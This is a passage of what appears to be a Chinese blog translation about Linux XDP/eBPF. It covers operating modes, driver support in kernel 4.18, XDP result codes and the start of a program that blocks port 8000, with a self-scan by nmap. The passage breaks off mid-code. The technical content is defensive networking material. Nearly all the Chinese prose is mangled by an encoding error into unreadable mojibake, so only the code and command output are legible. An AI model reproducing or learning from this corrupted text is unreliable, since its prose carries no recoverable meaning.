ã€‚</p><p>ç¼–å†™XDPç¨‹åºæ—¶è¦ç†è§£çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µæ˜¯å®ƒä»¬å°†è¿è¡Œçš„ä¸Šä¸‹æ–‡ä¹Ÿç§°ä¸ºæ“ä½œæ¨¡å¼ã€‚</p><h4 id="æ“ä½œæ¨¡å¼"><a href="#æ“ä½œæ¨¡å¼" class="headerlink" title="æ“ä½œæ¨¡å¼"></a>æ“ä½œæ¨¡å¼</h4><p>XDPå…·æœ‰ä¸‰ç§æ“ä½œæ¨¡å¼ï¼Œä»¥é€‚åº”æµ‹è¯•åŠŸèƒ½ã€ä¾›åº”å•†å®šåˆ¶ç¡¬ä»¶ä»¥åŠæ— éœ€å®šåˆ¶ç¡¬ä»¶çš„å¸¸ç”¨æ„å»ºå†…æ ¸ã€‚</p><h5 id="åŸç”ŸXDP"><a href="#åŸç”ŸXDP" class="headerlink" title="åŸç”ŸXDP"></a>åŸç”ŸXDP</h5><p>è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒXDP BPFç¨‹åºç›´æ¥åœ¨ç½‘ç»œé©±åŠ¨ç¨‹åºçš„æ¥æ”¶è·¯å¾„ä¹‹å¤–è¿è¡Œã€‚ä½¿ç”¨æ­¤æ¨¡å¼æ—¶ï¼Œè¯·åŠ¡å¿…æ£€æŸ¥é©±åŠ¨ç¨‹åºæ˜¯å¦æ”¯æŒã€‚ æ‚¨å¯ä»¥é€šè¿‡å¯¹ç»™å®šå†…æ ¸ç‰ˆæœ¬çš„æºä»£ç æ ‘æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# cd linux-4.18/</span><br><span class="line">[root@VM-16-14-centos linux-4.18]# git grep -l XDP_SETUP_PROG drivers/ </span><br><span class="line">drivers/net/ethernet/broadcom/bnxt/bnxt_xdp.c</span><br><span class="line">    drivers/net/ethernet/cavium/thunder/nicvf_main.c</span><br><span class="line">    drivers/net/ethernet/intel/i40e/i40e_main.c</span><br><span class="line">    drivers/net/ethernet/intel/ixgbe/ixgbe_main.c</span><br><span class="line">    drivers/net/ethernet/intel/ixgbevf/ixgbevf_main.c</span><br><span class="line">    drivers/net/ethernet/mellanox/mlx4/en_netdev.c</span><br><span class="line">    drivers/net/ethernet/mellanox/mlx5/core/en_main.c</span><br><span class="line">    drivers/net/ethernet/netronome/nfp/nfp_net_common.c</span><br><span class="line">    drivers/net/ethernet/qlogic/qede/qede_filter.c</span><br><span class="line">    drivers/net/netdevsim/bpf.c</span><br><span class="line">    drivers/net/tun.c</span><br><span class="line">    drivers/net/virtio_net.c</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå†…æ ¸ 4.18 æ”¯æŒä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>Broadcom NetXtreme-C/E network driver bnxt</li><li>Caviumthunderxdriver</li><li>Inteli40driver</li><li>Intelixgbeandixgvevfdrivers</li><li>Mellanoxmlx4andmlx5drivers</li><li>Netronome Network Flow Processor</li><li>QLogic qede NIC Driver</li><li>TUN/TAP</li><li>Virtio</li></ul><h5 id="å¸è½½XDP"><a href="#å¸è½½XDP" class="headerlink" title="å¸è½½XDP"></a>å¸è½½XDP</h5><p>åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒXDP BPFç¨‹åºç›´æ¥å¸è½½åˆ°NICä¸­ï¼Œè€Œä¸æ˜¯åœ¨ä¸»æœºCPUä¸Šæ‰§è¡Œã€‚ é€šè¿‡å°†æ‰§è¡Œä»CPUä¸­æ¨å¼€ï¼Œè¿™ç§æ¨¡å¼æ¯”åŸç”ŸXDPå…·æœ‰æ›´é«˜çš„æ€§èƒ½æå‡ã€‚</p><p>é€šè¿‡åœ¨æºç ä¸­æŸ¥æ‰¾<code>XDP_SETUP_PROG_HW</code>sæ¥æ£€æŸ¥<code>4.18</code>ä¸­å“ªäº›NICé©±åŠ¨ç¨‹åºæ”¯æŒç¡¬ä»¶å¸è½½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos linux-4.18]# git grep -l XDP_SETUP_PROG_HW drivers/</span><br><span class="line">include/linux/netdevice.h</span><br><span class="line">    866:    XDP_SETUP_PROG_HW,</span><br><span class="line">    net/core/dev.c</span><br><span class="line">    8001:           xdp.command = XDP_SETUP_PROG_HW;</span><br><span class="line">    drivers/net/netdevsim/bpf.c</span><br><span class="line">    200:    if (bpf-&gt;command == XDP_SETUP_PROG_HW &amp;&amp; !ns-&gt;bpf_xdpoffload_accept) &#123;</span><br><span class="line">    205:    if (bpf-&gt;command == XDP_SETUP_PROG_HW) &#123;</span><br><span class="line">    560:    case XDP_SETUP_PROG_HW:</span><br><span class="line">    drivers/net/ethernet/netronome/nfp/nfp_net_common.c</span><br><span class="line">    3476:   case XDP_SETUP_PROG_HW:</span><br></pre></td></tr></table></figure><p>è¿™ä»…æ˜¾ç¤ºäº†<code>Netronome</code>ç½‘ç»œæµå¤„ç†å™¨(nfp)ï¼Œæ„å‘³ç€å®ƒè¿˜å¯ä»¥é€šè¿‡æ”¯æŒç¡¬ä»¶å¸è½½å’Œæœ¬æœºXDPä¸¤ç§æ¨¡å¼è¿è¡Œã€‚</p><p>å¦‚æœæˆ‘æ²¡æœ‰ç½‘å¡å’Œé©±åŠ¨ç¨‹åºæ¥å°è¯•æˆ‘çš„XDPç¨‹åºæ—¶ï¼Œæˆ‘è¯¥æ€ä¹ˆåŠï¼Ÿ ç­”æ¡ˆå¾ˆç®€å•ï¼Œé€šç”¨XDPï¼</p><h5 id="é€šç”¨XDP"><a href="#é€šç”¨XDP" class="headerlink" title="é€šç”¨XDP"></a>é€šç”¨XDP</h5><p>è¿™æ˜¯ä¸ºæƒ³è¦ç¼–å†™å’Œè¿è¡ŒXDPç¨‹åºä½†ä¸å…·å¤‡æœ¬æœºæˆ–å¸è½½XDPåŠŸèƒ½çš„å¼€å‘äººå‘˜æä¾›çš„ä¸€ç§æµ‹è¯•æ¨¡å¼ã€‚ä»å†…æ ¸ç‰ˆæœ¬<code>4.12</code>å¼€å§‹æ”¯æŒé€šç”¨XDPã€‚ä¾‹å¦‚å¯ä»¥åœ¨<code>veth</code>è®¾å¤‡ä¸Šä½¿ç”¨æ­¤æ¨¡å¼è€Œæ— éœ€è´­ä¹°ç‰¹å®šçš„ç¡¬ä»¶æ¥è·Ÿéšã€‚</p><p>ä½†æ˜¯è°æ˜¯è´Ÿè´£åè°ƒæ‰€æœ‰ç»„ä»¶å’Œæ“ä½œæ¨¡å¼çš„å‚ä¸è€…å‘¢ï¼Ÿ ä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†å­¦ä¹ æ•°æ®åŒ…å¤„ç†å™¨ã€‚</p><h4 id="æ•°æ®åŒ…å¤„ç†å™¨"><a href="#æ•°æ®åŒ…å¤„ç†å™¨" class="headerlink" title="æ•°æ®åŒ…å¤„ç†å™¨"></a>æ•°æ®åŒ…å¤„ç†å™¨</h4><p>XDPæ•°æ®åŒ…å¤„ç†å™¨å¯ä»¥åœ¨XDPæ•°æ®åŒ…ä¸Šæ‰§è¡ŒBPFç¨‹åºå¹¶åè°ƒå®ƒä»¬ä¸ç½‘ç»œå †æ ˆä¹‹é—´çš„äº¤äº’ã€‚æ•°æ®åŒ…å¤„ç†å™¨æ˜¯XDPç¨‹åºçš„å†…æ ¸ç»„ä»¶ï¼Œå®ƒç›´æ¥å¤„ç†æ¥æ”¶(RX)é˜Ÿåˆ—ä¸Šçš„æ•°æ®åŒ…ï¼Œå› ä¸ºå®ƒä»¬ç”±NICå‘ˆç°ã€‚å®ƒç¡®ä¿æ•°æ®åŒ…æ˜¯å¯è¯»å’Œå¯å†™çš„ï¼Œå¹¶å…è®¸ä»¥æ•°æ®åŒ…å¤„ç†å™¨æ“ä½œçš„å½¢å¼é™„åŠ åå¤„ç†åˆ¤å†³ã€‚å¯ä»¥åœ¨è¿è¡Œæ—¶å®Œæˆå¯¹æ•°æ®åŒ…å¤„ç†å™¨çš„åŸå­ç¨‹åºæ›´æ–°å’Œæ–°ç¨‹åºåŠ è½½ï¼Œè€Œä¸ä¼šåœ¨ç½‘ç»œå’Œç›¸å…³æµé‡æ–¹é¢é€ æˆä»»ä½•æœåŠ¡ä¸­æ–­ã€‚åœ¨è¿è¡Œæ—¶ï¼ŒXDPå¯ä»¥åœ¨â€œå¿™è½®è¯¢â€æ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œå…è®¸ä¿ç•™å¿…é¡»å¤„ç†æ¯ä¸ªRXé˜Ÿåˆ—çš„CPUï¼›è¿™é¿å…äº†ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå¹¶å…è®¸åœ¨åˆ°è¾¾æ—¶ç«‹å³å“åº”æ•°æ®åŒ…ï¼Œè€Œä¸ç®¡IRQäº²ç¼˜å…³ç³»å¦‚ä½•ã€‚ XDPå¯ä»¥ä½¿ç”¨çš„å¦ä¸€ç§æ¨¡å¼æ˜¯â€œä¸­æ–­é©±åŠ¨â€æ¨¡å¼ï¼Œå¦ä¸€æ–¹é¢ï¼Œå®ƒä¸ä¿ç•™CPUï¼Œè€Œæ˜¯ä½œä¸ºäº‹ä»¶åª’ä»‹çš„ä¸­æ–­é€šçŸ¥CPUå¿…é¡»å¤„ç†æ–°äº‹ä»¶ï¼ŒåŒæ—¶ä»å¯ä»¥åšæ­£å¸¸çš„å¤„ç†ã€‚</p><p>åœ¨ä¸‹å›¾ä¸­å¯ä»¥çœ‹åˆ°RX/TXã€åº”ç”¨ç¨‹åºã€æ•°æ®åŒ…å¤„ç†å™¨å’Œåº”ç”¨äºæ•°æ®åŒ…çš„BPFç¨‹åºä¹‹é—´çš„äº¤äº’ç‚¹ã€‚</p><p><img src="/2022/05/29/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸‹ç¯‡-ç¿»è¯‘/4.png" alt="4"></p><p>è¯·æ³¨æ„åœ¨ä¸Šå›¾ä¸­æœ‰å‡ ä¸ªå¸¦æœ‰<code>XDP_</code>å‰ç¼€çš„å­—ç¬¦ä¸²æ–¹å—ã€‚ è¿™äº›æ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥ä»‹ç»çš„XDPç»“æœä»£ç ã€‚</p><h5 id="XDPç»“æœä»£ç ï¼ˆæ•°æ®åŒ…å¤„ç†å™¨æ“ä½œï¼‰"><a href="#XDPç»“æœä»£ç ï¼ˆæ•°æ®åŒ…å¤„ç†å™¨æ“ä½œï¼‰" class="headerlink" title="XDPç»“æœä»£ç ï¼ˆæ•°æ®åŒ…å¤„ç†å™¨æ“ä½œï¼‰"></a>XDPç»“æœä»£ç ï¼ˆæ•°æ®åŒ…å¤„ç†å™¨æ“ä½œï¼‰</h5><p>åœ¨æ•°æ®åŒ…å¤„ç†å™¨å¯¹æ•°æ®åŒ…åšå‡ºå†³å®šåï¼Œå¯ä»¥ä½¿ç”¨äº”ä¸ªè¿”å›ä»£ç ä¹‹ä¸€æ¥è¡¨ç¤ºï¼Œç„¶åå¯ä»¥æŒ‡ç¤ºç½‘ç»œé©±åŠ¨ç¨‹åºå¦‚ä½•å¤„ç†æ•°æ®åŒ…ï¼š</p><ul><li><p>DROP(XDP_DROP)</p><p>ä¸¢å¼ƒæ•°æ®åŒ…ã€‚è¿™å‘ç”Ÿåœ¨é©±åŠ¨ç¨‹åºä¸­æœ€æ—©çš„RXé˜¶æ®µï¼›ä¸¢å¼ƒä¸€ä¸ªæ•°æ®åŒ…åªæ˜¯æ„å‘³ç€å°†å®ƒå›æ”¶åˆ°å®ƒåˆšåˆšâ€œåˆ°è¾¾â€çš„RXç¯å½¢é˜Ÿåˆ—ä¸­ã€‚å°½æ—©ä¸¢å¼ƒæ•°æ®åŒ…æ˜¯ç¼“è§£æ‹’ç»æœåŠ¡(DoS)çš„å…³é”®ã€‚è¿™æ ·ï¼Œä¸¢å¼ƒçš„æ•°æ®åŒ…ä¼šä½¿ç”¨å°½å¯èƒ½å°‘çš„CPUå¤„ç†æ—¶é—´å’ŒåŠŸç‡ã€‚</p></li><li><p>Forward (XDP_TX)</p><p>è½¬å‘æ•°æ®åŒ…ã€‚ è¿™å¯èƒ½å‘ç”Ÿåœ¨æ•°æ®åŒ…è¢«ä¿®æ”¹ä¹‹å‰æˆ–ä¹‹åã€‚è½¬å‘æ•°æ®åŒ…æ„å‘³ç€å°†æ¥æ”¶åˆ°çš„æ•°æ®åŒ…é¡µé¢å¼¹å›å®ƒåˆ°è¾¾çš„åŒä¸€ä¸ªNICã€‚</p></li><li><p>Redirect (XDP_REDIRECT)</p><p>ä¸<code>XDP_TX</code>ç±»ä¼¼ï¼Œå®ƒèƒ½å¤Ÿä¼ è¾“XDPæ•°æ®åŒ…ï¼Œä½†å®ƒæ˜¯é€šè¿‡å¦ä¸€ä¸ªNICæˆ–<code>BPF cpumap</code>æ¥ä¼ è¾“çš„ã€‚åœ¨<code>BPF cpumap</code>çš„æƒ…å†µä¸‹ï¼Œåœ¨NICçš„æ¥æ”¶é˜Ÿåˆ—ä¸Šä¸ºXDPæœåŠ¡çš„CPUå¯ä»¥ç»§ç»­è¿™æ ·åšï¼Œå¹¶å°†ç”¨äºå¤„ç†ä¸Šå±‚å†…æ ¸å †æ ˆçš„æ•°æ®åŒ…æ¨é€åˆ°è¿œç¨‹CPUã€‚è¿™ç±»ä¼¼äº<code>XDP_PASS</code>ï¼Œä½†XDP BPFç¨‹åºå¯ä»¥ç»§ç»­ä¸ºä¼ å…¥çš„é«˜è´Ÿè½½æä¾›æœåŠ¡ã€‚</p></li><li><p>Passï¼ˆXDP_PASS)</p><p>å°†æ•°æ®åŒ…ä¼ é€’ç»™æ­£å¸¸çš„ç½‘ç»œå †æ ˆè¿›è¡Œå¤„ç†ã€‚è¿™ç›¸å½“äºæ²¡æœ‰XDPçš„é»˜è®¤æ•°æ®åŒ…å¤„ç†è¡Œä¸ºã€‚ é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼ä¹‹ä¸€å®Œæˆï¼š</p><ul><li>æ­£å¸¸æ¥æ”¶åˆ†é…å…ƒæ•°æ®ï¼ˆsk_buffï¼‰ï¼Œå°†æ•°æ®åŒ…æ¥æ”¶åˆ°å †æ ˆä¸Šï¼Œå¹¶å°†æ•°æ®åŒ…å¼•å¯¼åˆ°å¦ä¸€ä¸ª CPUè¿›è¡Œå¤„ç†ã€‚ å®ƒå…è®¸ç”¨æˆ·ç©ºé—´çš„åŸå§‹æ¥å£ã€‚ è¿™å¯èƒ½å‘ç”Ÿåœ¨æ•°æ®åŒ…è¢«ä¿®æ”¹ä¹‹å‰æˆ–ä¹‹åã€‚</li><li>é€šç”¨æ¥æ”¶å¸è½½(GRO)å¯ä»¥æ¥æ”¶å¤§æ•°æ®åŒ…å¹¶åˆå¹¶åŒä¸€è¿æ¥çš„æ•°æ®åŒ…ã€‚GROåœ¨å¤„ç†åæœ€ç»ˆå°†æ•°æ®åŒ…é€šè¿‡â€œæ­£å¸¸æ¥æ”¶â€æµç¨‹ã€‚</li></ul></li><li><p>Code error (XDP_ABORTED)</p><p>è¡¨ç¤ºeBPFç¨‹åºé”™è¯¯å¹¶å¯¼è‡´æ•°æ®åŒ…è¢«ä¸¢å¼ƒã€‚ å®ƒä¸æ˜¯å‡½æ•°å¼ç¨‹åºåº”è¯¥ç”¨ä½œè¿”å›ç çš„ä¸œè¥¿ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç¨‹åºé™¤ä»¥é›¶ï¼Œå°†è¿”å›XDP_ABORTEDã€‚ XDP_ABORTEDçš„å€¼å°†å§‹ç»ˆä¸ºé›¶ã€‚å®ƒé€šè¿‡ <code>trace_xdp_exception</code>è·Ÿè¸ªç‚¹å¯ä»¥é¢å¤–ç›‘è§†è¯¥è·Ÿè¸ªç‚¹ä»¥æ£€æµ‹ä¸å½“è¡Œä¸ºã€‚</p></li></ul><p>è¿™äº›åŠ¨ä½œä»£ç åœ¨<code>linux/bpf.h</code>å¤´æ–‡ä»¶ä¸­è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> xdp_action &#123;</span><br><span class="line">        XDP_ABORTED = <span class="number">0</span>,</span><br><span class="line">        XDP_DROP,</span><br><span class="line">        XDP_PASS,</span><br><span class="line">        XDP_TX,</span><br><span class="line">        XDP_REDIRECT,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å› ä¸ºXDPåŠ¨ä½œå†³å®šäº†ä¸åŒçš„è¡Œä¸ºå¹¶ä¸”å®ƒæ˜¯ä¸€ç§æ•°æ®åŒ…å¤„ç†å™¨çš„å†…éƒ¨æœºåˆ¶ï¼Œæ‰€ä»¥å¯ä»¥æŸ¥çœ‹å¦‚ä¸‹å›¾çš„ç®€åŒ–ç‰ˆæœ¬ï¼Œä»…å…³æ³¨è¿”å›åŠ¨ä½œã€‚</p><p><img src="/2022/05/29/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸‹ç¯‡-ç¿»è¯‘/5.png" alt="5"></p><p>XDPç¨‹åºçš„ä¸€ä¸ªæœ‰è¶£ä¹‹å¤„åœ¨äºï¼Œä½ é€šå¸¸ä¸éœ€è¦ç¼–å†™åŠ è½½ç¨‹åºæ¥åŠ è½½å®ƒä»¬ã€‚åœ¨å¤§å¤šæ•°Linuxæœºå™¨ä¸­éƒ½æœ‰é€šè¿‡ipå‘½ä»¤å®ç°çš„æ¯”è¾ƒå¥½çš„åŠ è½½ç¨‹åºã€‚ä¸‹ä¸€èŠ‚å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨å®ƒã€‚</p><h4 id="XDPå’Œiproute2ä½œä¸ºåŠ è½½å™¨"><a href="#XDPå’Œiproute2ä½œä¸ºåŠ è½½å™¨" class="headerlink" title="XDPå’Œiproute2ä½œä¸ºåŠ è½½å™¨"></a>XDPå’Œiproute2ä½œä¸ºåŠ è½½å™¨</h4><p><code>iproute2</code>ä¸­å¯ç”¨çš„<code>ip</code>å‘½ä»¤èƒ½å¤Ÿå……å½“å‰ç«¯æ¥åŠ è½½ç¼–è¯‘æˆELFæ–‡ä»¶çš„XDPç¨‹åºï¼Œå¹¶ä¸”å®Œå…¨æ”¯æŒæ˜ å°„ã€æ˜ å°„é‡å®šä½ã€å°¾è°ƒç”¨å’Œå¯¹è±¡å›ºå®šã€‚</p><p>å› ä¸ºåŠ è½½XDPç¨‹åºå¯ä»¥è¡¨ç¤ºä¸ºå¯¹ç°æœ‰ç½‘ç»œæ¥å£çš„é…ç½®ï¼Œæ‰€ä»¥åŠ è½½ç¨‹åºä½œä¸º<code>ip link</code>å‘½ä»¤çš„ä¸€éƒ¨åˆ†å®ç°ï¼Œè¯¥å‘½ä»¤ç”¨äºé…ç½®ç½‘ç»œè®¾å¤‡ã€‚</p><p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬å°è¯•ä¸€ä¸ªä¾‹å­</p><p>åœºæ™¯æ˜¯æˆ‘ä»¬æœ‰ä¸€ä¸ªç³»ç»Ÿï¼Œåœ¨ç«¯å£<code>8000</code>ä¸Šæœ‰ä¸€ä¸ªWebæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡ç¦æ­¢æ‰€æœ‰ TCP è¿æ¥æ¥é˜»æ­¢å¯¹å…¶åœ¨æœåŠ¡å™¨çš„é¢å‘å…¬ä¼—çš„NICä¸Šçš„ä»»ä½•é¡µé¢çš„è®¿é—®ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡pythonèµ·ä¸€ä¸ªç®€å•çš„æœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>åœ¨ç½‘ç»œæœåŠ¡å™¨å¯åŠ¨åï¼Œå®ƒçš„å¼€æ”¾ç«¯å£å°†æ˜¾ç¤ºåœ¨ä½¿ç”¨<code>ss</code>çš„å¼€æ”¾å¥—æ¥å­—ä¸­ã€‚ç½‘ç»œæœåŠ¡å™¨ç»‘å®šåˆ°ä»»ä½•æ¥å£ *:8000ï¼Œå› æ­¤åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä»»ä½•å¯ä»¥è®¿é—®æˆ‘ä»¬å…¬å…±æ¥å£çš„å¤–éƒ¨è°ƒç”¨è€…éƒ½å¯ä»¥çœ‹åˆ°å®ƒçš„å†…å®¹ï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ss -tulpn</span><br><span class="line">Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process </span><br><span class="line">tcp     LISTEN   0        5                0.0.0.0:8000          0.0.0.0:*       users:(("python3",pid=5210,fd=3))</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¥—æ¥å­—ç»Ÿè®¡ä¿¡æ¯ï¼Œç»ˆç«¯ä¸­çš„ ssï¼Œæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨äºè°ƒæŸ¥ Linux ä¸­çš„ç½‘ç»œå¥—æ¥å­—ã€‚ å®ƒå®é™…ä¸Šæ˜¯netstat çš„ç°ä»£ç‰ˆæœ¬ï¼Œå…¶ç”¨æˆ·ä½“éªŒç±»ä¼¼äº Netstatï¼Œè¿™æ„å‘³ç€æ‚¨å¯ä»¥ä¼ é€’ç›¸åŒçš„å‚æ•°å¹¶è·å¾—å¯æ¯”è¾ƒçš„ç»“æœã€‚</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥ä½¿ç”¨<code>nmap</code>æ£€æŸ¥è¿œç¨‹ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@VM-16-14-centos ~]# nmap -sS 10.0.16.14</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-02 12:45 CST</span><br><span class="line">Nmap scan report for 10.0.16.14</span><br><span class="line">Host is up (0.0000030s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8000/tcp open  http-alt</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>nmap</code>å¯ä»¥çœ‹åˆ°<code>8000</code>ç«¯å£ï¼Œç°åœ¨æˆ‘ä»¬è¦å°é”è¯¥ç«¯å£</p><p>æˆ‘ä»¬çš„ç¨‹åºå°†åŒ…å«ä¸€ä¸ªåä¸º<code>program.c</code>çš„æºæ–‡ä»¶ï¼Œå®ƒéœ€è¦ä½¿ç”¨IPv4 <code>iphdr</code>å’Œä»¥å¤ªç½‘å¸§<code>ethhdr</code> æ ‡å¤´ç»“æ„ä»¥åŠåè®®å¸¸é‡å’Œå…¶ä»–ç»“æ„ã€‚ è®©æˆ‘ä»¬åŒ…å«æ‰€éœ€çš„æ ‡é¢˜ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>åŒ…å«å¤´æ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åœ¨å‰é¢ç« èŠ‚ä¸­å·²ç»é‡åˆ°çš„SECå®ï¼Œç”¨äºå£°æ˜ELFå±æ€§ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å£°æ˜ç¨‹åºçš„ä¸»å…¥å£ç‚¹<code>myprogram</code>åŠELFèŠ‚åç§°<code>mysection</code>ã€‚ æˆ‘ä»¬çš„ç¨‹åºå°†<code>xdp_md</code>ç»“æ„æŒ‡é’ˆä½œä¸ºè¾“å…¥ä¸Šä¸‹æ–‡ï¼Œå®ƒæ˜¯é©±åŠ¨ç¨‹åºå†…<code>xdp_buff</code>çš„BPFç­‰ä»·ç‰©ã€‚ é€šè¿‡ä½¿ç”¨å®ƒä½œä¸ºä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬å®šä¹‰æ¥ä¸‹æ¥å°†ä½¿ç”¨çš„å˜é‡ï¼Œä¾‹å¦‚æ•°æ®æŒ‡é’ˆã€ä»¥å¤ªç½‘å’ŒIPå±‚ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"mysection"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br></pre></td></tr></table></figure><p>å› 